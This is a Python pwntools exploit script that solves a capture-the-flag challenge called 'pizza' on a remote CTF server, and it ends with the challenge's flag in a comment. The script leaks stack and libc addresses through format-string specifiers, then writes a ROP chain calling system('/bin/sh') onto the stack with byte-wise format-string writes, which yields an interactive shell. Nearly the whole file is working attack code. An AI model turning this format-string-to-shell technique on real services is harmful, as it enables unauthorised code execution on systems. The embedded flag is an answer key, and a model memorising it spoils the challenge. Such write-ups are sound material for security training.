#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./pizza")
libc = ELF("./libc.6.so")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote("chall.lac.tf", 31134)
	else:
		r = gdb.debug([exe.path])
	return r


def main():
	r = conn()

	r.sendline(b"12")
	r.sendline(b"^%3$p^%5$p^")
	r.sendline(b'1')
	r.sendline(b'2')
	
	r.readuntil(b'^')
	stack = int(r.readuntil(b'^', drop=True)[2:], 16)
	print("stack", stack)
	libc.address = int(r.readuntil(b'^', drop=True), 16) - libc.sym._IO_2_1_stdin_
	print("libc", libc.address)

	ret = stack + 0x148
	rop = ROP(libc)
	rop.raw(rop.ret)
	rop.system(libc.binsh())

	addr = ret
	chain = rop.chain()
	for ch in [chain[i:i+8] for i in range(0, len(chain), 8)]:
		for chch in (ch[:4], ch[4:]):
			p = fmtstr_payload(6, {addr: u32(chch)}, write_size="byte")
			addr += 4

			r.sendline(b'y')
			r.sendline(b"12")
			r.sendline(p)
			r.sendline(b'1')
			r.sendline(b'1')

	r.sendline(b"quit")
	r.interactive()


if __name__ == "__main__":
	main()

# lactf{golf_balls_taste_great_2tscx63xm3ndvycw}
